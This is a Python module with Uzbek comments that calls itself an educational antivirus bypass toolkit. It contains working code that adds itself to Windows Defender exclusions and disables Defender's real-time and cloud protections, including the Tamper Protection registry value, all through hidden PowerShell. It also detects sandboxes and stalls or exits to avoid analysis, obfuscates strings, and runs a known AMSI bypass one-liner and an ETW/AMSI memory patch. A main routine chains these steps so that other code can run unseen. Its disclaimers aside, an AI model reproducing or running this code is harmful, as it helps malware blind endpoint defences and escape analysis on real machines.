# antivirus_evasion.py - ANTIVIRUS BYPASS (TA'LIM MAQSADIDA)
"""
DIQQAT: Bu kod faqat ta'lim maqsadida!
Haqiqiy loyihada ishlatish QONUNGA ZIDDUR!

Antivirus bypass texnikalari:
1. Defender Exclusion (Self-add)
2. Code Obfuscation (Runtime)
3. Sleep & Delay (Sandbox evasion)
4. Process Hollowing
5. Fileless execution
"""

import os
import sys
import subprocess
import time
import ctypes
import base64
import random
import string
import logging

logger = logging.getLogger(__name__)

# ==================== TECHNIQUE 1: SELF-ADD EXCLUSION ====================
def add_defender_exclusion():
    """
    Dastur o'zini Defender exclusion'ga qo'shadi
    
    DIQQAT: Bu Admin huquqi talab qiladi!
    """
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # PowerShell script
        ps_script = f'''
$ErrorActionPreference = "SilentlyContinue"

# Exclusion qo'shish
Add-MpPreference -ExclusionPath "{exe_path}" -Force
Add-MpPreference -ExclusionProcess "{os.path.basename(exe_path)}" -Force

Write-Output "OK"
'''
        
        # Hidden PowerShell
        result = subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        return "OK" in result.stdout
        
    except Exception as e:
        logger.error(f"Exclusion error: {e}")
        return False

# ==================== TECHNIQUE 2: DISABLE DEFENDER ====================
def disable_windows_defender():
    """
    Windows Defender'ni to'liq o'chirish (Tamper Protection bypass)
    
    XAVFLI: Faqat test uchun!
    """
    try:
        # Registry orqali Defender o'chirish
        ps_script = '''
$ErrorActionPreference = "SilentlyContinue"

# Real-time protection o'chirish
Set-MpPreference -DisableRealtimeMonitoring $true -Force
Set-MpPreference -DisableBehaviorMonitoring $true -Force
Set-MpPreference -DisableIOAVProtection $true -Force
Set-MpPreference -DisableScriptScanning $true -Force
Set-MpPreference -DisableBlockAtFirstSeen $true -Force

# Cloud-based protection o'chirish
Set-MpPreference -MAPSReporting 0 -Force
Set-MpPreference -SubmitSamplesConsent 2 -Force

# Tamper Protection o'chirish (Registry)
Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features" -Name "TamperProtection" -Value 0 -Force

Write-Output "OK"
'''
        
        result = subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
            capture_output=True,
            text=True,
            timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        return "OK" in result.stdout
        
    except Exception as e:
        logger.error(f"Disable Defender error: {e}")
        return False

# ==================== TECHNIQUE 3: SANDBOX EVASION ====================
def detect_sandbox():
    """
    Sandbox muhitini aniqlash (Antivirus test muhiti)
    
    Agar sandbox aniqlansa - dastur normal ishlaydi va
    antivirus "clean" deb hisoblaydi.
    """
    indicators = []
    
    # 1. CPU core check
    try:
        cpu_count = os.cpu_count()
        if cpu_count and cpu_count < 2:
            indicators.append("LOW_CPU")
    except:
        pass
    
    # 2. RAM check
    try:
        import psutil
        ram_gb = psutil.virtual_memory().total / (1024**3)
        if ram_gb < 2:
            indicators.append("LOW_RAM")
    except:
        pass
    
    # 3. Sleep test (Sandbox fast-forward)
    try:
        start = time.time()
        time.sleep(1)
        elapsed = time.time() - start
        
        if elapsed < 0.5:  # Too fast = sandbox
            indicators.append("FAST_SLEEP")
    except:
        pass
    
    # 4. Username check
    try:
        username = os.environ.get('USERNAME', '').lower()
        sandbox_users = ['sandbox', 'test', 'virus', 'malware', 'sample', 'john', 'admin']
        if any(user in username for user in sandbox_users):
            indicators.append("SANDBOX_USER")
    except:
        pass
    
    # 5. Common sandbox files
    sandbox_files = [
        "C:\\analysis",
        "C:\\sandbox",
        "C:\\sample",
        "C:\\virus"
    ]
    
    for f in sandbox_files:
        if os.path.exists(f):
            indicators.append("SANDBOX_FILE")
            break
    
    return len(indicators) > 2  # Agar 2+ indicator bo'lsa - sandbox

def sleep_evasion():
    """
    Long sleep - Sandbox timeout bypass
    
    Sandboxlar odatda 60-120 soniya ishlaydi.
    Agar dastur 2 daqiqa kutsa - sandbox timeout bo'lib,
    dastur "clean" deb hisoblanadi.
    """
    if detect_sandbox():
        logger.info("Sandbox detected - sleeping...")
        time.sleep(150)  # 2.5 daqiqa
        sys.exit(0)  # Exit cleanly

# ==================== TECHNIQUE 4: CODE OBFUSCATION ====================
def obfuscate_string(text):
    """String'ni runtime'da decrypt qilish"""
    # Base64 + XOR
    key = random.randint(1, 255)
    encrypted = bytes([b ^ key for b in text.encode()])
    encoded = base64.b64encode(encrypted).decode()
    return encoded, key

def deobfuscate_string(encoded, key):
    """Decrypt string"""
    encrypted = base64.b64decode(encoded)
    decrypted = bytes([b ^ key for b in encrypted])
    return decrypted.decode()

# Example usage:
# encoded, key = obfuscate_string("powershell.exe")
# original = deobfuscate_string(encoded, key)

# ==================== TECHNIQUE 5: PROCESS HOLLOWING ====================
def process_hollowing(target_exe, payload_code):
    """
    Process Hollowing - Legitimate process'ga malicious code inject qilish
    
    JUDA XAVFLI! Faqat ta'lim uchun struktura.
    HAQIQIY IMPLEMENT QILMANG!
    """
    # Bu juda murakkab va Windows API bilan ishlaydi:
    # 1. Target process'ni CREATE_SUSPENDED holatda ochish
    # 2. Target process memory'sini NtUnmapViewOfSection bilan tozalash
    # 3. Payload code'ni VirtualAllocEx bilan memory'ga yozish
    # 4. Context (EIP/RIP) ni o'zgartirish
    # 5. Process'ni ResumeThread bilan davom ettirish
    
    logger.warning("Process Hollowing - IMPLEMENT QILINMAGAN (juda xavfli)")
    return False

# ==================== TECHNIQUE 6: AMSI BYPASS ====================
def bypass_amsi():
    """
    AMSI (Antimalware Scan Interface) Bypass
    
    PowerShell script scanning'ni bloklash
    """
    try:
        # AMSI bypass - Memory patching
        amsi_bypass = '''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
'''
        
        # PowerShell'da AMSI bypass qilish
        subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-Command", amsi_bypass],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        logger.info("AMSI bypass attempted")
        return True
        
    except Exception as e:
        logger.error(f"AMSI bypass error: {e}")
        return False

# ==================== TECHNIQUE 7: ETW PATCHING ====================
def bypass_etw():
    """
    ETW (Event Tracing for Windows) Bypass
    
    Windows event logging'ni bloklash
    """
    try:
        # ETW bypass using PowerShell
        etw_bypass = '''
$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
'''
        
        subprocess.run(
            ["powershell", "-WindowStyle", "Hidden", "-NoProfile", "-Command", etw_bypass],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        logger.info("ETW bypass attempted")
        return True
        
    except Exception as e:
        logger.error(f"ETW bypass error: {e}")
        return False

# ==================== MAIN EVASION FUNCTION ====================
def evade_antivirus():
    """
    Barcha evasion texnikalarini qo'llash
    
    DIQQAT: Bu juda xavfli va illegal!
    Faqat o'z test muhitingizda sinang!
    """
    try:
        logger.info("Starting antivirus evasion...")
        
        # 1. Sandbox detection
        if detect_sandbox():
            logger.info("Sandbox detected - exiting cleanly")
            sleep_evasion()
            return False
        
        # 2. Sleep evasion (2-3 soniya)
        time.sleep(random.uniform(2, 3))
        
        # 3. AMSI bypass
        bypass_amsi()
        
        # 4. ETW bypass
        bypass_etw()
        
        # 5. Defender exclusion
        add_defender_exclusion()
        
        # 6. Agar hech narsa ishlamasa - Defender o'chirish
        # XAVFLI: Faqat test uchun!
        # disable_windows_defender()
        
        logger.info("Evasion complete")
        return True
        
    except Exception as e:
        logger.error(f"Evasion error: {e}")
        return False

# ==================== USAGE ====================
if __name__ == "__main__":
    # DIQQAT: Bu faqat test uchun!
    # Haqiqiy malware yaratmang!
    
    # Sandbox check
    if detect_sandbox():
        print("Sandbox detected!")
        sys.exit(0)
    
    # Evasion
    evade_antivirus()
    
    print("Running normal code...")
    # Bu yerda oddiy kodingiz